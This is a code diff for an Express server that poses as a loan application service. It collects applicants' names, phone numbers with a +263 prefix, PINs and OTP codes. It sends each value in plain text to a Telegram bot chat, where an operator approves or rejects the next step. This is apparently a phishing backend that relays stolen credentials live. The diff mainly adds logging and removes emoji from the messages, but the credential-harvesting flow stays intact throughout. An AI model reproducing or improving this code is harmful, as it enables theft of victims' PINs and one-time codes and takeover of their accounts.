@@ -27,9 +27,12 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 // In-memory store
 const applications = {};
 
-// Telegram helper (NO parse_mode – avoids markdown errors)
+// Telegram helper (plain text, no markdown)
 async function sendTelegramMessage(message, buttons = null) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.log('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
+    return;
+  }
   const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
   if (buttons) body.reply_markup = { inline_keyboard: buttons };
   try {
@@ -41,6 +44,8 @@ async function sendTelegramMessage(message, buttons = null) {
     const data = await response.json();
     if (!data.ok) {
       console.error('Telegram API error:', data);
+    } else {
+      console.log('✅ Telegram message sent');
     }
   } catch (e) {
     console.error('Telegram send error:', e);
@@ -54,6 +59,7 @@ app.get('/api/health', (req, res) => res.json({ ok: true }));
 
 // Submit application
 app.post('/api/send-application', async (req, res) => {
+  console.log('📥 Received application submission');
   const data = req.body.applicationData;
   const appId = `${data.phone}_${Date.now()}`;
 
@@ -67,10 +73,11 @@ app.post('/api/send-application', async (req, res) => {
     createdAt: new Date().toISOString()
   };
 
-  const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${appId}\n📱 Phone: +263${data.phone}\n💰 Amount: $${data.loanAmount}\n📅 Duration: ${data.loanDuration} days\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Approve or reject:*`;
+  console.log(`✅ Application stored: ${appId}`);
+  const message = `NEW LOAN APPLICATION\nID: ${appId}\nPhone: +263${data.phone}\nAmount: $${data.loanAmount}\nDuration: ${data.loanDuration} days\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
   const buttons = [[
-    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId: appId }) },
-    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId: appId }) }
+    { text: 'YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId: appId }) },
+    { text: 'NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId: appId }) }
   ]];
 
   await sendTelegramMessage(message, buttons);
@@ -79,9 +86,13 @@ app.post('/api/send-application', async (req, res) => {
 
 // Send PIN
 app.post('/api/send-pin', async (req, res) => {
+  console.log('📥 Received PIN submission');
   const { applicationId, pin } = req.body;
   const app = applications[applicationId];
-  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+  if (!app) {
+    console.error(`❌ Application not found: ${applicationId}`);
+    return res.status(404).json({ ok: false, error: 'Application not found' });
+  }
 
   if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
     return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
@@ -93,11 +104,12 @@ app.post('/api/send-pin', async (req, res) => {
 
   app.pin = pin;
   app.pinStatus = 'pending';
+  console.log(`✅ PIN stored for ${applicationId}`);
 
-  const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Approve or reject:*`;
+  const message = `PIN VERIFICATION\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
   const buttons = [[
-    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
-    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
+    { text: 'YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
+    { text: 'NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
   ]];
 
   await sendTelegramMessage(message, buttons);
@@ -112,11 +124,12 @@ app.post('/api/send-otp', async (req, res) => {
 
   app.otp = otp;
   app.otpStatus = 'pending';
+  console.log(`✅ OTP stored for ${applicationId}`);
 
-  const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Approve or reject:*`;
+  const message = `OTP VERIFICATION\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
   const buttons = [[
-    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
-    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
+    { text: 'YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
+    { text: 'NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
   ]];
 
   await sendTelegramMessage(message, buttons);
@@ -130,10 +143,10 @@ app.post('/api/resend-otp', async (req, res) => {
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
   app.otpStatus = 'pending';
-  const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📌 New OTP requested.\n✅ *Approve or reject:*`;
+  const message = `OTP RESENT - ADMIN ACTION REQUIRED\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
   const buttons = [[
-    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
-    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
+    { text: 'YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
+    { text: 'NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
   ]];
 
   await sendTelegramMessage(message, buttons);
@@ -162,13 +175,19 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
 
 // ─── Telegram Webhook ───
 app.post('/api/telegram-webhook', async (req, res) => {
+  console.log('📩 Webhook received');
   const update = req.body;
 
   if (update.callback_query) {
     const query = update.callback_query;
     const { action, step, applicationId } = JSON.parse(query.data);
     const app = applications[applicationId];
-    if (!app) return res.sendStatus(200);
+    if (!app) {
+      console.error(`❌ App not found in webhook: ${applicationId}`);
+      return res.sendStatus(200);
+    }
+
+    console.log(`🔘 Processing callback: action=${action}, step=${step}, appId=${applicationId}`);
 
     if (step === 'PIN') {
       if (action === 'YES') {
@@ -196,20 +215,21 @@ app.post('/api/telegram-webhook', async (req, res) => {
       body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${action}` })
     });
 
-    await sendTelegramMessage(`📌 *Status Update*\n🆔 ID: ${applicationId}\n📋 ${step}: ${action}`);
+    await sendTelegramMessage(`Status Update\nID: ${applicationId}\nStep: ${step}\nAction: ${action}`);
     return res.sendStatus(200);
   }
 
   if (update.message && update.message.text) {
     const text = update.message.text.trim();
     const chatId = update.message.chat.id;
+    console.log(`💬 Message from ${chatId}: ${text}`);
     if (chatId.toString() === TELEGRAM_CHAT_ID) {
       if (text === '/stats') {
         const total = Object.keys(applications).length;
-        await sendTelegramMessage(`📊 Total applications: ${total}`);
+        await sendTelegramMessage(`Total applications: ${total}`);
       } else if (text === '/list') {
         const ids = Object.keys(applications).slice(-5);
-        let msg = '📋 Recent applications:\n';
+        let msg = 'Recent applications:\n';
         ids.forEach(id => {
           const app = applications[id];
           msg += `${id} – ${app.phone} (PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
@@ -234,4 +254,5 @@ app.get('*', (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📁 Serving frontend from: ${frontendPath}`);
 });
